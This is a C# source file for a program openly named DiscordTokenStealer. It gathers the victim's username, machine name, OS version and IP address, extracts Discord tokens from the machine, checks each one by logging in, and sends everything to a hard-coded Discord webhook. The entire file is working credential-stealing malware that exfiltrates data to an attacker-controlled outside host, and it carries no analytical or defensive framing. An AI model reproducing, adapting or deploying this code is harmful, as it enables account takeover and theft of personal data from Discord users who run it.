using System.Collections.Concurrent;
using Cysharp.Text;
using DiscordTokenStealer;
using DiscordTokenStealer.Discord;

using var content = ZString.CreateUtf8StringBuilder();
content.AppendLine($"Username: {Environment.UserName}");
content.AppendLine($"Machine Name: {Environment.MachineName}");
content.AppendLine($"Operating System: {Environment.OSVersion.Platform} ({(Environment.Is64BitOperatingSystem ? "64-bit" : "32-bit")})");
content.AppendLine($"IP-Address: {await IpInfo.GetIPAddress()}");
content.AppendLine("Token(s): ");

var loggedUsers = new ConcurrentBag<string>();
using var discordClient = new DiscordClient();
await foreach (var token in TokenParser.ParseAsync())
{
    if (await discordClient.LoginAsync(token) is not { } discordUser || loggedUsers.Contains(discordUser.Id))
        continue;
    content.Append(discordUser.ToString());
    loggedUsers.Add(discordUser.Id);
}

var message = content.ToString();

using var webhook = new DiscordWebhookClient("https://discord.com/api/webhooks/1230453243042070558/b8rBODHxzRagpNBrjL5cpPEEbDrfjngE2icghEVa-wKCSJfwenZTYgFyI5T7EwChjhOL");
await webhook.SendMessage(new DiscordMessage(message));
